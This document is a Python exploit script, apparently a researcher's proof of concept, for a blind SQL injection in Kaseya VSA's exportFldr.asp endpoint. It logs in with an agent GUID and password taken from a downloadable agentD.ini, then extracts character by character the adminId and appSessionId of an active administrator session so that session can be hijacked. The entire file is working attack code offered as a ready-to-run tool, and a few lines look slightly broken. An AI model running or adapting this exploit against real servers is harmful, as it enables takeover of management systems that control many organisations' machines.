#!/bin/python3
#############
# SOME DISCLAIMER HERE
# WIETSE FOUND IT
# DIVD STUFF
# DONATE LINK
# 
#  _____ _______      _______         _ 
# |  __ \_   _\ \    / /  __ \       | |
# | |  | || |  \ \  / /| |  | | _ __ | |
# | |  | || |   \ \/ / | |  | || '_ \| |
# | |__| || |_   \  /  | |__| || | | | |
# |_____/_____|   \/   |_____(_)_| |_|_|                                     
#
#############
from requests import Request, Session
import urllib3
import argparse
from urllib import parse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class exploitSQLi(object):
    def __init__(self, host, agentguid, password, sid, proxy=None):
        self.host = host
        self.agentguid = agentguid
        self.password = password
        self.proxy = proxy
        self.sessionId = sid
        self.ASPSESSIONID = None
        self.s = None
    def getSessionId(self):
        try:
            s = Session()
            s.verify = False
            if self.sessionId and not (self.agentguid or not self.password):
                s.cookies['sessionId'] = self.sessionId
                self.s = s
                # We already have the agent sessionId so no need to fetch it!
                return self.sessionId
            if not self.agentguid or not self.password:
                # print ("Missing agentguid, agent password or session id")
                raise Exception("Missing arguments")
            url = "https://{}/dl.asp?un={}&pw={}".format(self.host, self.agentguid, self.password)
            resp = s.get(url, proxies=self.proxy)
            if resp.status_code == 200:
                self.sessionId = s.cookies['sessionId']
                print ("Using sessionId: {}".format(self.sessionId))
                self.s = s
                return self.sessionId
            else: 
                return None
        except Exception as e:
            print (e)
    def req(self, target):
        r = self.s.get(target, proxies=self.proxy, verify=False)
        if r.status_code == 200:
            return True
        elif r.status_code == 301:
            # TODO TEST!!!
            self.getSessionId()
            return req(target)
        return False
    def sqli(self, inj_str, substring, rstart=32, rstop=126, extra=[]):
        try:
            if not self.s:
                self.getSessionId()
            l = list(range(rstart, rstop+1))
            if extra:
                l.extend(extra)
            inj_str = inj_str.replace(" ", "%20")
            for j in l:
                target = "https://{}/InstallTab/exportFldr.asp?fldrId={}".format(self.host, inj_str.format(substring, str(j)))
                # r = self.s.get(target, proxies=self.proxy, verify=False)
                if self.req(target):
                    return j
            return None
        except Exception as e:
            print (e)
            return None
    def query(self, Select, Column, From):
        length_of_value = ""
        position = 1 
        while True:
            try: 
                substring = "SUBSTRING((SELECT {0} master.dbo.fn_varbintohexstr(CAST(ISNULL(CAST({1} AS NVARCHAR(4000)),CHAR(32)) AS VARBINARY(8000))) {2}),{3},1))".format( Select, Column, From, position )
                injection_string = "(SELECT (CASE WHEN (UNICODE({}={}) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END))"
                # find the character (Ascii 48-57 == 0-9) (Ascii 32-126 == full ascii set) 
                # But we are getting hex values ('0x35003000320038003600390032003300') so 0-9 (Ascii 48-57) and x (120) are only needed
                extracted_char = chr(self.sqli(injection_string, substring, rstart=48, rstop=57, extra=[120] ))
                length_of_value = "{}{}".format(length_of_value,extracted_char)
                position = position + 1
                if length_of_value.count("0") > 40: 
                    #lets break if loop returns 40 times a 0 we assume there is no data to recover.
                    break 
            except Exception as e:
                break
        # length_of_value = '0x35003000320038003600390032003300'
        # remove 0x
        value = str(length_of_value[2:])
        n = 4
        ret = ""
        # split value in chunks of 4
        for r in [value[i:i+n] for i in range(0, len(value), n)]:
            # remove the last 2 digits from (3500)
            # decode the hex value (35) to character (5) and concatenate
            ret = "{}{}".format(ret, bytes.fromhex(r[0:2]).decode('utf-8'))
        return ret

def main():
    parser = argparse.ArgumentParser(description='Exploit SQLi in Kaseya to retreive admin sessionId')
    parser.add_argument('-t','--target',
                        required=True,
                        help='IP or domain'
                    )
    parser.add_argument('-p','--port',
                        required=True,
                        default=5721,
                        help='Port of Kaseya default 5721, 80 or 443'
                    )
    parser.add_argument('--agentguid', 
                        help='Agent Id (can be found in the agentD.ini, this can be dowloaded https://target/dl.asp)'
                    )
    parser.add_argument('--agentpw', 
                        help='Agent password (can be found in the agentD.ini, this can be dowloaded https://target/dl.asp)'
                    )
    parser.add_argument('--sessionid', 
                        help='if already an active sessionID has been found use this we dont need to authenticate'
                    )
    parser.add_argument('--proxy', 
                        default=None,
                        help='set to proxy 127.0.0.1:8080'
                    )
    args = parser.parse_args()
    sid = args.sessionid
    target = args.target
    port = args.port
    agentguid = args.agentguid
    agentpassword = args.agentpw
    proxy = args.proxy
    if proxy:
        proxy = "{ 'http' : '{0}', 'https': {0} }".format(proxy)
    try:
        result = exploitSQLi(
            target,
            agentguid,
            agentpassword,
            sid,
            proxy
            )
        if not sid:
            sessionId = result.getSessionId()
        adminIdSelect = "TOP 1"
        adminIdColumn = "adminId"
        adminIdFrom = "FROM appSession WHERE adminGroupId=2 AND sessionExpiration > getdate()"
        # This will turn in to:
        #  SUBSTRING((
        #       SELECT TOP 1 master.dbo.fn_varbintohexstr(
        #           CAST(
        #               ISNULL(
        #                   CAST(adminId AS NVARCHAR(4000)),CHAR(32)
        #               ) AS VARBINARY(8000)
        #           )
        #       ) FROM appSession WHERE adminGroupId=2 AND sessionExpiration > getdate()
        #   ),1,1))
        adminId = result.query(adminIdSelect,adminIdColumn,adminIdFrom )
        if adminId:
            print ("Admin SessionId: {}".format(adminId))
            adminIdColumn = "appSessionId"
            adminAppSessionId = result.query(adminIdSelect,adminIdColumn,adminIdFrom )
            print ("AdminAppSessionId: {}".format(adminAppSessionId))
        else:
            print ("No active Admin session? Try again later?")
    except Exception as e:
        print (e)
        
if __name__ == "__main__":
    main()
